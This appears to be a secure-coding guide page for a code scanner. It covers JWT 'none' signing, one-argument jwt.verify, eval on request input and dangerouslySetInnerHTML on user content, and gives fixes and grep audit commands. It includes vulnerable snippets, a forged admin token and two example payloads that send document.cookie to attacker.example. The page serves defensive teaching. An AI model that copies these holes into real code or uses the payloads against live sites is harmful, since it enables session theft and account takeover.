---
title: Auth weaknesses — JWT alg-none and friends
slug: auth-weakness
type: pattern
last_updated: 2026-05-12
draft: false
related_probe_ids:
  - Auth Weakness
  - API Route Auth
related_incident_slugs: []
sources:
  - title: OWASP JWT for Java Cheat Sheet
    url: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
  - title: OWASP A07 — Identification and Authentication Failures
    url: https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
  - title: CWE-327 — Use of a Broken or Risky Cryptographic Algorithm
    url: https://cwe.mitre.org/data/definitions/327.html
  - title: CWE-95 — Improper Neutralization of Directives in Dynamically Evaluated Code
    url: https://cwe.mitre.org/data/definitions/95.html
  - title: React Docs — dangerouslySetInnerHTML
    url: https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html
  - title: RFC 7518 — JSON Web Algorithms
    url: https://datatracker.ietf.org/doc/html/rfc7518
summary: A cluster of four auth-related code shapes that AI tools produce often and that all share the same underlying defect. The shortest path that compiles is the unsafe path. Worth catching at scan time because they all encode "no review needed" by their syntax.
---

## What this is

Four specific code shapes Pre-Flight scans for, grouped because they share the same defect: each looks like working auth code, each compiles, each ships a critical hole.

**JWT with `algorithm: 'none'`.** A JSON Web Token is a three-part string: header, payload, signature. The header names which algorithm signed the token. The string `'none'` is a legal algorithm value in the JWT spec. A token signed with `'none'` has an empty signature. Any verifier that accepts `'none'` will verify any payload as valid. An attacker forges a token claiming to be the admin user, the verifier returns "yes, this is admin," the request goes through.

```js
// Critical.
const t = jwt.sign({ sub: 'admin', role: 'admin' }, null, { algorithm: 'none' });
// Token verifies as authentic because there is no signature to check.
```

**`jwt.verify(token)` without a secret argument.** Most JWT libraries take the secret as the second argument to `verify`. If it's omitted, the library either throws (best case), uses an empty string (worst case), or silently accepts unsigned tokens (some legacy versions). The pattern of "I have a token, call verify on it, trust the result" with no secret in the signature looks like working auth and isn't.

```js
// Critical.
const decoded = jwt.verify(token);
// No secret means no signature check. decoded is just JSON.parse on base64.
```

**`eval()` on anything that touches user input.** `eval` executes its string argument as JavaScript in the current scope. If any of that string came from a request, a database row populated by a request, or a query parameter, you have remote code execution.

```js
// Critical.
const result = eval(req.body.expression);
// req.body.expression = "fetch('https://attacker.example/exfil?d=' + document.cookie)" → executed.
```

The same applies to `new Function(string)`, `setTimeout(string, n)` when the first argument is a string, and the `[].constructor.constructor('...')()` indirect-eval trick that some sandboxes miss.

**`dangerouslySetInnerHTML={{ __html: userContent }}`.** React's deliberate escape hatch for rendering HTML strings as actual DOM. The `dangerously` in the name is not for show: when the string contains user-controlled content, you have stored XSS. An attacker submits a comment containing `<script>fetch('https://attacker.example/?c='+document.cookie)</script>`, the comment renders, every visitor's session cookie posts to the attacker.

```jsx
// Critical.
return <div dangerouslySetInnerHTML={{ __html: comment.body }} />;
// Anyone who has ever submitted a comment can run code in every other visitor's browser.
```

Pre-Flight flags all four shapes with comment-awareness: a literal `// TODO: never use eval()` does not fire the probe. The probe is looking for runtime use, not the word "eval" in a comment.

## Why it matters

Each shape is, by itself, a complete authentication or authorization bypass.

A JWT signed with `'none'` is forgeable by anyone with a JSON encoder. There is no protected resource left, regardless of how good the rest of the system is.

A `jwt.verify(token)` with no secret returns "decoded" for any input. Every authenticated route is an open route to anyone who can guess a username.

`eval` on user input means the server (or the browser, depending on where it runs) executes attacker code. There is no "lateral movement" needed; the lateral movement is the first request.

`dangerouslySetInnerHTML` on user content turns one user's session into an attack on every other user. The blast radius scales with the active user count.

These are not "make the system more robust" findings. These are "the system has no system" findings.

## Why AI coding tools produce this

The training data has all four shapes. Tutorials demonstrating "how JWTs work" use `algorithm: 'none'` because it skips the cryptography. Examples showing "decoding a JWT" leave out the secret because they only want to show the payload shape. Examples showing dynamic-expression evaluation reach for `eval` because it is the shortest function name that does the job. React examples that need to render HTML strings (rich-text editors, markdown previews) reach for `dangerouslySetInnerHTML` because it is the only API that does that.

A model asked "wire up JWT auth" will sometimes produce the simplest example that compiles. The simplest example is the one with no signature check. A model asked "render this HTML" produces `dangerouslySetInnerHTML` because the function name encodes the intent.

The model is not malicious; it is statistical. The fix is not "use a different model." The fix is "the codebase rejects these shapes at the same gate that catches type errors."

## What the fix looks like

Four motions, one per shape.

**JWT: use HS256 or RS256, never 'none'. Pass an allowlist.**

```js
import jwt from 'jsonwebtoken';

// Symmetric (single service, secret on the server). Use a 32+ byte random secret.
const t = jwt.sign(payload, process.env.JWT_SECRET, { algorithm: 'HS256' });

const decoded = jwt.verify(token, process.env.JWT_SECRET, {
  algorithms: ['HS256'],  // explicit allowlist; rejects any other algorithm including 'none'
});
```

Or, for cross-service scenarios where the verifier should not hold the signing key:

```js
import jwt from 'jsonwebtoken';

const decoded = jwt.verify(token, PUBLIC_KEY_PEM, {
  algorithms: ['RS256'],
});
```

The `algorithms` array on `verify` is the load-bearing argument. Without it, the library may accept whatever the token's header says, including `'none'`. With it, the verifier rejects any algorithm not in the allowlist. The fix is one line.

For services using a different JWT library: every modern JWT implementation has an equivalent "allowed algorithms" parameter. `jose` calls it `algorithms`. PyJWT calls it `algorithms`. Go's `jwt-go` requires a `keyFunc` that returns the key only for explicitly trusted algorithms.

**Eval: use a parser, not an interpreter.**

If you need to evaluate a math expression: use a math expression library (`mathjs`, `expr-eval`) that parses to an AST and evaluates symbolically, never running arbitrary code.

If you need to support templating: use a template library (`handlebars`, `nunjucks`) that compiles strings to a constrained subset, never the full JavaScript language.

If you need to evaluate user-provided code in a sandbox (the rare legitimate case): use V8 isolates (`isolated-vm`) or a separate WebAssembly process. The browser `eval` and the server-side `new Function` are not sandboxes; they share scope with everything else.

```diff
- const result = eval(req.body.expression);
+ import { evaluate } from 'mathjs';
+ const result = evaluate(req.body.expression);
```

**dangerouslySetInnerHTML: sanitize, or render structure.**

If the content is user-generated rich text: pass it through DOMPurify before rendering.

```jsx
import DOMPurify from 'dompurify';
return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment.body) }} />;
```

If the content is markdown: use a markdown renderer that produces React elements directly (`react-markdown`), not HTML strings.

```jsx
import ReactMarkdown from 'react-markdown';
return <ReactMarkdown>{comment.body}</ReactMarkdown>;
```

If the content is your own static HTML (e.g., a CMS-managed page): consider whether you can render it as components instead. Static HTML strings are easier to sanitize than user-generated HTML, but the safer pattern is to not have the HTML strings at all.

**JWT secret: rotate, scope, and audit.**

A `jwt.verify(token, "supersecret")` with a hardcoded secret in source is a JWT system where everyone who has ever seen the source code can forge any token. Move the secret to an environment variable, rotate it (which invalidates every outstanding token and forces re-auth), and add a structured log line that records which user the token claimed to be on each verify call. The log line catches replay attempts and the rotation cycle.

## How to audit existing code

```bash
# Grep for the obvious shapes. Anything that matches is a hit unless it's in a comment.
grep -rE 'algorithm:\s*[\"\047]?none[\"\047]?' src/
grep -rE 'jwt\.verify\(\s*[A-Za-z_][A-Za-z0-9_]*\s*\)' src/  # one-arg verify
grep -rE '\beval\s*\(' src/
grep -rE 'dangerouslySetInnerHTML' src/
```

Pre-Flight runs the equivalents at scan time, with comment-awareness so a docstring mentioning `// never use eval()` does not fire.

## Related

- [Hardcoded secrets in source](/learn/patterns/secret-scanner) covers the JWT-secret-in-source case from the credential-leak side.
- [NEXT_PUBLIC_ misuse](/learn/patterns/next-public-misuse) covers the related failure mode where the JWT-signing secret gets exposed via the browser bundle.

## Sources

OWASP's JWT cheat sheet is the canonical reference for safe verification. RFC 7518 is the IETF spec that defines `'none'` as an algorithm. CWE-327 names the broken-algorithm class. CWE-95 names the `eval`-on-user-input class. React's `dangerouslySetInnerHTML` doc is the authoritative reference for that API and includes its own "use with caution" framing.
